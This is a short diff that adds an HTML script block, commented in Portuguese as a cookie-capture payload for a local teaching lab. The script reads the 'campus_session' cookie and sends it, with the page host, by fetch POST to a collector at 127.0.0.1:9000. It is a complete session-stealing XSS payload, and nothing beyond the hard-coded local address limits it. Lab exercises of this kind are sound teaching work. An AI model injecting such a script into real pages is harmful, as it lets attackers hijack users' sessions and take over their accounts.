@@ -1,0 +1,19 @@
+<script>
+/* Payload de CAPTURA — laboratório local, uso didático.
+   Restrito ao portal local e ao endpoint fixo do coletor (127.0.0.1:9000).
+   Lê APENAS o cookie campus_session e o envia de propósito ao coletor.
+   Não envia todos os cookies, não coleta senhas, não tem destino configurável. */
+(function () {
+  var m = document.cookie.match(/(?:^|;\s*)campus_session=([^;]+)/);
+  if (!m) return;                       // sem cookie legível: nada a fazer
+  var token = m[1];                     // somente o campus_session
+  fetch('http://127.0.0.1:9000/collect', {
+    method: 'POST',
+    mode: 'no-cors',                    // requisição simples; não lemos a resposta
+    credentials: 'omit',               // sem cookies automáticos do coletor
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'token=' + encodeURIComponent(token) +
+          '&origin=' + encodeURIComponent(location.host)
+  });
+})();
+</script>
